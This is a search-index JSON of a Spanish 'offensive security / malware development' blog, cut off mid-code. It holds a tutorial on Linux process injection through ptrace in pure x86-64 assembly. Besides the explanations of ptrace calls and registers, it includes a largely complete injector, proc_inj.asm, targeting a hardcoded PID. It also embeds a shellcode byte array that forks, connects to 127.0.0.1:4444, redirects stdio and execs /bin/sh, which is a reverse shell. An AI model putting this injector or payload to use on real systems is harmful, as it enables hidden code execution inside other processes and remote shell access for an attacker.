{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"RAZOR","text":"Offensive Security Research <p>       Notas t\u00e9cnicas sobre seguridad ofensiva y desarrollo de malware en Linux.     </p> <p>       \u26a0\ufe0f Todo el contenido es exclusivamente con fines educativos y de investigaci\u00f3n.     </p> Malware Dev"},{"location":"#secciones","title":"Secciones","text":"Malware Development Shellcode, process injection, t\u00e9cnicas ofensivas Low-level"},{"location":"#ultimos-posts","title":"\u00daltimos posts","text":"Process Injection via Ptrace Inyecci\u00f3n de c\u00f3digo en procesos Linux usando ptrace en ASM puro Assembly 15 min Shellcode Basics Desarrollo de shellcode x86-64 para Linux Assembly 8 min"},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Disclaimer</p> <p>Este contenido es exclusivamente para fines educativos y de investigaci\u00f3n en entornos autorizados.</p>"},{"location":"research/malware-dev/#articulos","title":"Art\u00edculos","text":"Assembly Shellcode Basics Fundamentos de desarrollo de shellcode x86-64 Assembly Process Injection via Ptrace Inyecci\u00f3n de c\u00f3digo en procesos Linux usando ptrace puro"},{"location":"research/malware-dev/ptrace-injection/","title":"Process Injection via Ptrace - Just ASM","text":"<p>Inyecci\u00f3n de c\u00f3digo en procesos Linux usando ptrace, implementado completamente en ensamblador x86-64. Sin dependencias externas, sin libc, solo syscalls puras.</p>"},{"location":"research/malware-dev/ptrace-injection/#introduccion","title":"Introducci\u00f3n","text":"<p>La inyecci\u00f3n de procesos es una t\u00e9cnica fundamental en el arsenal de cualquier investigador de seguridad, desarrollador de malware o ingeniero de sistemas. Consiste en insertar y ejecutar c\u00f3digo arbitrario dentro del espacio de memoria de un proceso que ya est\u00e1 en ejecuci\u00f3n, sin necesidad de modificar el binario original en disco.</p>"},{"location":"research/malware-dev/ptrace-injection/#por-que-es-importante","title":"\u00bfPor qu\u00e9 es importante?","text":"<p>Esta t\u00e9cnica tiene aplicaciones tanto leg\u00edtimas como maliciosas:</p> <p>Usos leg\u00edtimos:</p> <ul> <li>Depuraci\u00f3n: Herramientas como GDB, LLDB y otros depuradores utilizan ptrace para inspeccionar y controlar procesos, establecer breakpoints, y examinar el estado de la memoria y registros.</li> <li>Instrumentaci\u00f3n din\u00e1mica: Herramientas como strace (para trazar syscalls) y ltrace (para trazar llamadas a bibliotecas) dependen completamente de ptrace.</li> <li>Profiling y an\u00e1lisis de rendimiento: Permite insertar c\u00f3digo de medici\u00f3n sin recompilar la aplicaci\u00f3n.</li> <li>Hot-patching: Actualizar c\u00f3digo en producci\u00f3n sin reiniciar servicios cr\u00edticos.</li> </ul> <p>Usos maliciosos:</p> <ul> <li>Malware y rootkits: Inyectar payloads en procesos leg\u00edtimos para evadir detecci\u00f3n.</li> <li>Robo de credenciales: Inyectar c\u00f3digo en navegadores o gestores de contrase\u00f1as.</li> <li>Persistencia: Mantener acceso incluso si el binario malicioso original es eliminado.</li> <li>Evasi\u00f3n de seguridad: Ejecutar c\u00f3digo desde procesos confiables para bypass de firewalls y EDRs.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#por-que-ensamblador-puro","title":"\u00bfPor qu\u00e9 ensamblador puro?","text":"<p>Implementar esta t\u00e9cnica en ensamblador puro (sin libc) tiene varias ventajas:</p> <ol> <li>Comprensi\u00f3n profunda: Obliga a entender exactamente qu\u00e9 est\u00e1 pasando a nivel de sistema operativo.</li> <li>Sin dependencias: El binario resultante no depende de bibliotecas externas.</li> <li>Tama\u00f1o m\u00ednimo: Ideal para shellcodes y payloads donde el espacio es limitado.</li> <li>Control total: No hay abstracciones que oculten el comportamiento real.</li> <li>Aplicabilidad a shellcode: Las mismas t\u00e9cnicas se usan para escribir shellcodes position-independent.</li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#la-syscall-ptrace","title":"La Syscall ptrace","text":"<p><code>ptrace</code> (process trace) es una syscall de Linux que proporciona a un proceso (llamado tracer) la capacidad de observar y controlar la ejecuci\u00f3n de otro proceso (llamado tracee). Es la base sobre la que se construyen los depuradores en Linux.</p>"},{"location":"research/malware-dev/ptrace-injection/#prototipo","title":"Prototipo","text":"<pre><code>long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);\n</code></pre> <p>En ensamblador x86-64:</p> <ul> <li>RAX = 101 (n\u00famero de syscall para ptrace)</li> <li>RDI = request (operaci\u00f3n a realizar)</li> <li>RSI = pid (PID del proceso objetivo)</li> <li>RDX = addr (direcci\u00f3n, uso depende de la operaci\u00f3n)</li> <li>R10 = data (datos, uso depende de la operaci\u00f3n)</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#operaciones-de-ptrace-utilizadas","title":"Operaciones de ptrace utilizadas","text":""},{"location":"research/malware-dev/ptrace-injection/#ptrace_attach-16-0x10","title":"PTRACE_ATTACH (16 / 0x10)","text":"<pre><code>mov rax, 101\nmov rdi, 16          ; PTRACE_ATTACH\nmov rsi, &lt;pid&gt;       ; PID del proceso objetivo\nxor rdx, rdx\nxor r10, r10\nsyscall\n</code></pre> <p>Prop\u00f3sito: Adjuntarse a un proceso existente para controlarlo.</p> <p>Comportamiento:</p> <ul> <li>El tracer se convierte en el \"padre\" del tracee para efectos de ptrace.</li> <li>El kernel env\u00eda una se\u00f1al <code>SIGSTOP</code> al tracee, deteniendo su ejecuci\u00f3n.</li> <li>El tracee queda en estado \"stopped\" hasta que el tracer lo reanude.</li> <li>Requiere que el tracer tenga permisos adecuados (mismo UID, CAP_SYS_PTRACE, o root).</li> </ul> <p>Importante: Despu\u00e9s de PTRACE_ATTACH, siempre debes llamar a <code>wait()</code> o <code>waitpid()</code> para sincronizarte con la detenci\u00f3n del proceso.</p>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_getregs-12-0x0c","title":"PTRACE_GETREGS (12 / 0x0C)","text":"<pre><code>mov rax, 101\nmov rdi, 12          ; PTRACE_GETREGS\nmov rsi, &lt;pid&gt;\nxor rdx, rdx\nlea r10, [rel buffer] ; puntero a user_regs_struct\nsyscall\n</code></pre> <p>Prop\u00f3sito: Obtener todos los registros del CPU del tracee.</p> <p>Comportamiento:</p> <ul> <li>Copia el estado completo de los registros del tracee a un buffer en el tracer.</li> <li>El buffer debe tener espacio para <code>user_regs_struct</code> (216 bytes en x86-64).</li> <li>Incluye registros de prop\u00f3sito general, RIP, RSP, flags, y registros de segmento.</li> </ul> <p>Uso t\u00edpico: Guardar el estado original antes de modificar el proceso, para poder restaurarlo despu\u00e9s.</p>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_setregs-13-0x0d","title":"PTRACE_SETREGS (13 / 0x0D)","text":"<pre><code>mov rax, 101\nmov rdi, 13          ; PTRACE_SETREGS\nmov rsi, &lt;pid&gt;\nxor rdx, rdx\nlea r10, [rel buffer] ; puntero a user_regs_struct modificada\nsyscall\n</code></pre> <p>Prop\u00f3sito: Establecer todos los registros del CPU del tracee.</p> <p>Comportamiento:</p> <ul> <li>Sobrescribe todos los registros del tracee con los valores del buffer.</li> <li>Permite modificar el flujo de ejecuci\u00f3n cambiando RIP.</li> <li>Permite configurar argumentos para syscalls cambiando RDI, RSI, RDX, etc.</li> </ul> <p>Uso t\u00edpico: Preparar el tracee para ejecutar una syscall espec\u00edfica (como mmap) o redirigir la ejecuci\u00f3n a c\u00f3digo inyectado.</p>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_peekdata-2-0x02","title":"PTRACE_PEEKDATA (2 / 0x02)","text":"<pre><code>mov rax, 101\nmov rdi, 2           ; PTRACE_PEEKDATA\nmov rsi, &lt;pid&gt;\nmov rdx, &lt;addr&gt;      ; direcci\u00f3n a leer en el tracee\nlea r10, [rsp]       ; donde guardar el resultado\nsyscall\n</code></pre> <p>Prop\u00f3sito: Leer datos de la memoria del tracee.</p> <p>Comportamiento:</p> <ul> <li>Lee exactamente 8 bytes (un qword en x86-64) de la direcci\u00f3n especificada.</li> <li>Los datos se devuelven en el puntero proporcionado en R10.</li> <li>La direcci\u00f3n debe ser v\u00e1lida en el espacio de direcciones del tracee.</li> </ul> <p>Uso t\u00edpico: Leer las instrucciones originales antes de sobrescribirlas, o inspeccionar datos en memoria.</p>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_pokedata-5-0x05","title":"PTRACE_POKEDATA (5 / 0x05)","text":"<pre><code>mov rax, 101\nmov rdi, 5           ; PTRACE_POKEDATA\nmov rsi, &lt;pid&gt;\nmov rdx, &lt;addr&gt;      ; direcci\u00f3n a escribir en el tracee\nmov r10, &lt;value&gt;     ; valor de 8 bytes a escribir\nsyscall\n</code></pre> <p>Prop\u00f3sito: Escribir datos en la memoria del tracee.</p> <p>Comportamiento:</p> <ul> <li>Escribe exactamente 8 bytes en la direcci\u00f3n especificada del tracee.</li> <li>Puede escribir en cualquier regi\u00f3n de memoria, incluso en regiones de solo lectura (como .text).</li> <li>El kernel bypasea las protecciones de memoria normales.</li> </ul> <p>Uso t\u00edpico: Inyectar instrucciones, modificar datos, o escribir shellcode en memoria.</p>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_singlestep-9-0x09","title":"PTRACE_SINGLESTEP (9 / 0x09)","text":"<pre><code>mov rax, 101\nmov rdi, 9           ; PTRACE_SINGLESTEP\nmov rsi, &lt;pid&gt;\nxor rdx, rdx\nxor r10, r10\nsyscall\n</code></pre> <p>Prop\u00f3sito: Ejecutar una sola instrucci\u00f3n del tracee y detenerse.</p> <p>Comportamiento:</p> <ul> <li>Reanuda el tracee.</li> <li>El tracee ejecuta exactamente una instrucci\u00f3n.</li> <li>El tracee se detiene de nuevo autom\u00e1ticamente.</li> <li>El tracer debe llamar a <code>wait()</code> para sincronizarse.</li> </ul> <p>Uso t\u00edpico: Ejecutar una syscall (como mmap) que hemos configurado previamente, y luego recuperar el resultado.</p>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_detach-17-0x11","title":"PTRACE_DETACH (17 / 0x11)","text":"<pre><code>mov rax, 101\nmov rdi, 17          ; PTRACE_DETACH\nmov rsi, &lt;pid&gt;\nxor rdx, rdx\nxor r10, r10         ; signal = 0 (no enviar se\u00f1al)\nsyscall\n</code></pre> <p>Prop\u00f3sito: Desconectarse del tracee y permitir que contin\u00fae su ejecuci\u00f3n normal.</p> <p>Comportamiento:</p> <ul> <li>Termina la relaci\u00f3n tracer-tracee.</li> <li>El tracee contin\u00faa ejecut\u00e1ndose normalmente.</li> <li>Opcionalmente puede enviar una se\u00f1al al tracee (nosotros enviamos 0 = ninguna).</li> </ul> <p>Uso t\u00edpico: Liberar el proceso despu\u00e9s de haber completado la inyecci\u00f3n.</p>"},{"location":"research/malware-dev/ptrace-injection/#estructura-user_regs_struct","title":"Estructura user_regs_struct","text":"<p>En x86-64 Linux, la estructura <code>user_regs_struct</code> contiene todos los registros del CPU. Conocer su layout es esencial para manipular el estado del proceso:</p> Offset Registro Descripci\u00f3n 0x00 r15 Registro de prop\u00f3sito general (callee-saved) 0x08 r14 Registro de prop\u00f3sito general (callee-saved) 0x10 r13 Registro de prop\u00f3sito general (callee-saved) 0x18 r12 Registro de prop\u00f3sito general (callee-saved) 0x20 rbp Base pointer (callee-saved) 0x28 rbx Registro de prop\u00f3sito general (callee-saved) 0x30 r11 Clobbered por syscall (almacena RFLAGS) 0x38 r10 4to argumento de syscall 0x40 r9 6to argumento de syscall 0x48 r8 5to argumento de syscall 0x50 rax N\u00famero de syscall / valor de retorno 0x58 rcx Clobbered por syscall (almacena RIP de retorno) 0x60 rdx 3er argumento de syscall 0x68 rsi 2do argumento de syscall 0x70 rdi 1er argumento de syscall 0x78 orig_rax N\u00famero original de syscall (para restart) 0x80 rip Instruction pointer (pr\u00f3xima instrucci\u00f3n) 0x88 cs Code segment 0x90 eflags Flags del CPU 0x98 rsp Stack pointer 0xA0 ss Stack segment 0xA8 fs_base Base del segmento FS (usado para TLS) 0xB0 gs_base Base del segmento GS 0xB8 ds Data segment 0xC0 es Extra segment 0xC8 fs FS segment 0xD0 gs GS segment <p>La estructura tiene un tama\u00f1o total de 27 qwords (216 bytes).</p>"},{"location":"research/malware-dev/ptrace-injection/#consideraciones-sobre-little-endian","title":"Consideraciones sobre Little-Endian","text":"<p>x86-64 usa little-endian, lo que significa que el byte menos significativo (LSB) se almacena primero en memoria. Esto es crucial al trabajar con valores en memoria:</p> <pre><code>Valor en registro: 0x00007ffe6f9001b0\n\nDescomposici\u00f3n:\n  0x 00 00 7f fe 6f 90 01 b0\n     \u25b2                    \u25b2\n     \u2502                    \u2502\n    MSB                 LSB\n   (m\u00e1s significativo) (menos significativo)\n\n\nEn memoria (little-endian, LSB primero):\n\nRIP \u2192 0x7f7a85496687:  \u250c\u2500\u2500\u2500\u2500\u2510\n                       \u2502 b0 \u2502 \u2190 Primer byte en memoria\n      0x7f7a85496688:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 01 \u2502\n      0x7f7a85496689:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 90 \u2502\n      0x7f7a8549668a:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 6f \u2502\n      0x7f7a8549668b:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 fe \u2502\n      0x7f7a8549668c:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 7f \u2502\n      0x7f7a8549668d:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 00 \u2502\n      0x7f7a8549668e:  \u251c\u2500\u2500\u2500\u2500\u2524\n                       \u2502 00 \u2502\n                       \u2514\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Por esto, cuando inyectamos la instrucci\u00f3n <code>syscall</code> (bytes <code>0x0F 0x05</code>), debemos usar el valor <code>0x050F</code> en little-endian para que se almacene correctamente como <code>0F 05</code> en memoria.</p>"},{"location":"research/malware-dev/ptrace-injection/#flujo-general-de-la-inyeccion","title":"Flujo general de la inyecci\u00f3n","text":"<p>Antes de ver el c\u00f3digo, entendamos el flujo completo:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  1. ATTACH: Conectarse al proceso v\u00edctima                       \u2502\n\u2502     \u2514\u2500&gt; El proceso se detiene (SIGSTOP)                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  2. GETREGS: Guardar estado original                            \u2502\n\u2502     \u2514\u2500&gt; Backup de todos los registros                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  3. PEEKDATA + POKEDATA: Inyectar instrucci\u00f3n \"syscall\"         \u2502\n\u2502     \u2514\u2500&gt; Sobrescribir temporalmente donde apunta RIP             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  4. SETREGS: Configurar registros para mmap()                   \u2502\n\u2502     \u2514\u2500&gt; RAX=9, RDI=0, RSI=4096, RDX=7, R10=34, R8=-1, R9=0      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  5. SINGLESTEP: Ejecutar mmap() en contexto v\u00edctima             \u2502\n\u2502     \u2514\u2500&gt; Se reserva memoria RWX, direcci\u00f3n en RAX                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  6. GETREGS: Obtener resultado de mmap                          \u2502\n\u2502     \u2514\u2500&gt; RAX contiene la direcci\u00f3n de la nueva memoria           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  7. POKEDATA: Restaurar bytes originales                        \u2502\n\u2502     \u2514\u2500&gt; Devolver el c\u00f3digo original donde estaba RIP            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  8. SETREGS: Restaurar registros originales                     \u2502\n\u2502     \u2514\u2500&gt; El proceso podr\u00eda continuar normalmente                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  9. POKEDATA: Guardar RIP de retorno en memoria mmap            \u2502\n\u2502     \u2514\u2500&gt; Al final de la p\u00e1gina (offset +4088)                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  10. POKEDATA (loop): Escribir shellcode                        \u2502\n\u2502      \u2514\u2500&gt; Copiar shellcode byte a byte a memoria RWX             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  11. SETREGS: Redirigir RIP al shellcode                        \u2502\n\u2502      \u2514\u2500&gt; RIP = direcci\u00f3n base de mmap                           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  12. DETACH: Liberar proceso                                    \u2502\n\u2502      \u2514\u2500&gt; El proceso contin\u00faa ejecutando el shellcode            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#inyector-principal-proc_injasm","title":"Inyector Principal (proc_inj.asm)","text":"<p>A continuaci\u00f3n se presenta el c\u00f3digo completo del inyector con explicaciones detalladas de cada secci\u00f3n:</p> <pre><code>section .data\nshellcode:\n    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x83, 0xf8, 0x00, 0x74, 0x11, 0x4c, 0x8d, 0x1d\n    db 0xec, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xb3, 0xf8\n    db 0x0f, 0x00, 0x00, 0x41, 0xff, 0xe6, 0xb8, 0x70\n    db 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x29, 0x00\n    db 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe\n    db 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x0f\n    db 0x05, 0x49, 0x89, 0xc0, 0xb8, 0x2a, 0x00, 0x00\n    db 0x00, 0x4c, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x41\n    db 0x51, 0x49, 0xba, 0x02, 0x00, 0x11, 0x5c, 0x7f\n    db 0x00, 0x00, 0x01, 0x41, 0x52, 0x48, 0x89, 0xe6\n    db 0xba, 0x10, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x31, 0xf6, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c\n    db 0x89, 0xc7, 0x0f, 0x05, 0x48, 0xff, 0xc6, 0x48\n    db 0x83, 0xfe, 0x03, 0x7c, 0xed, 0xb8, 0x3b, 0x00\n    db 0x00, 0x00, 0x6a, 0x00, 0x49, 0xbc, 0x2f, 0x62\n    db 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x41, 0x54\n    db 0x48, 0x89, 0xe7, 0x6a, 0x00, 0x48, 0x89, 0xe6\n    db 0x6a, 0x00, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xb8\n    db 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f\n    db 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90\nsc_len equ $ - shellcode\n\nsection .bss\n    regs resq 27  ; sizeof(user_regs_struct) en x86_64  (27x8 bytes)\n    regs_ori resq 27\n    regs_sys resq 27 \n\n\nsection .text\nglobal _start\n_start:\n\n    ; PID\n    mov r15, 26559\n\n\n; 1 Attach y detenci\u00f3n del proceso:\n\n    ; PTRACE_ATTACH\n    mov rax, 101\n    mov rdi, 16          ; PTRACE_ATTACH (0x10)\n    mov rsi, r15         ; PID\n    xor rdx,rdx          ; addr\n    xor r10, r10         ; data\n    syscall\n\n\n    ; WAIT4: \n        ; Cuando se hace PTRACE_ATTACH, el kernel env\u00eda SIGSTOP al proceso objetivo. \n        ; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  \n        ; est\u00e9 efectivamente detenido antes de poder manipularlo.\n\n        mov rax, 61\n        mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n        sub rsp, 8\n        mov rsi, rsp            ; &amp;status\n        xor rdx, rdx            ; options\n        xor r10, r10            ; rusage\n        syscall\n\n; -----------------------------------------\n\n; 2 Preservaci\u00f3n del contexto de ejecuci\u00f3n\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n    ; En este punto, regs contiene:\n    ; 0x00  r15\n    ; 0x08  r14\n    ; 0x10  r13\n    ; 0x18  r12\n    ; 0x20  rbp\n    ; 0x28  rbx\n    ; 0x30  r11\n    ; 0x38  r10\n    ; 0x40  r9\n    ; 0x48  r8\n    ; 0x50  rax\n    ; 0x58  rcx\n    ; 0x60  rdx\n    ; 0x68  rsi\n    ; 0x70  rdi\n    ; 0x78  orig_rax\n    ; 0x80  rip\n    ; 0x88  cs\n    ; 0x90  eflags\n    ; 0x98  rsp\n    ; 0xA0  ss\n    ; 0xA8  fs_base\n    ; 0xB0  gs_base\n    ; 0xB8  ds\n    ; 0xC0  es\n    ; 0xC8  fs\n    ; 0xD0  gs\n\n    ; Copia de los registros originales del traceee en el buffer de backup\n    lea rsi, [rel regs]       ; RSI se usa como puntero de origen y va avanzando\n    lea rdi, [rel regs_ori]   ; RDI se usa como puntero destino y va avanzando\n\n    mov rcx, 27               ; RCX se usa como contador y se va decrementando hasta 0\n    cld                       ; DF=0 (direcci\u00f3n de copia ascendente)\n    rep movsq                 ; mueve RCX qwords: [RSI] -&gt; [RDI]\n\n                    ; movsq copia un qword (8 bytes) desde la direcci\u00f3n apuntada por RSI hacia la direcci\u00f3n apuntada por RDI   \n                    ; rep repite esa operaci\u00f3n RCX veces\n\n; -----------------------------------------\n\n\n; 3 Inyecci\u00f3n de la instrucci\u00f3n syscall (0x0f 0x05)\n\n\n    mov r12, [regs+0x80]   ; Contenido del RIP del proceso tracee (direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n a ejecutar)\n\n    ; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la direcci\u00f3n actual a la que apunta el RIP del proceso tracee\n    mov rax, 101\n    mov rdi, 2       ; PTRACE_PEEKDATA\n    mov rsi, r15     ; PID\n    mov rdx, r12     ; addr\n    sub rsp, 8       ; 8 bytes\n    mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n    syscall \n\n    mov r11, [rsp] ; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee\n    mov r13, r11 ; Backup del valor original\n    and r11, 0xFFFFFFFFFFFF0000 ; limpiar los 2 bytes bajos\n    or r11, 0x000000000000050F  ; insertar syscall (0x0f 0x05 en little-endian)\n\n    ; PTRACE_POKEDATA (escribir en memoria)\n    mov rax, 101\n    mov rdi, 5     ; PTRACE_POKEDATA\n    mov rsi, r15   ; PID\n    mov rdx, r12   ; addr \n    mov r10, r11   ; valor de 8 bytes a escribir\n    syscall\n\n\n; -----------------------------------------\n\n\n; 4 Configuraci\u00f3n de registros para MMAP\n\n\n    ; MMAP\n\n        mov qword [regs+0x50], 9       ; (RAX) Se sustituye todo el valor del registro       N\u00famero de syscall para mmap\n        mov qword [regs+0x70],0        ; (RDI)       rdi = addr = 0 (NULL) \u2192 Pide al kernel que elija la direcci\u00f3n\n        mov qword [regs+0x68],4096     ; (RSI)    rsi = length = 4096 bytes (1 p\u00e1gina t\u00edpica)\n        mov qword [regs+0x60],7        ; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)\n        mov qword [regs+0x38],34       ; (R10)      r10 = 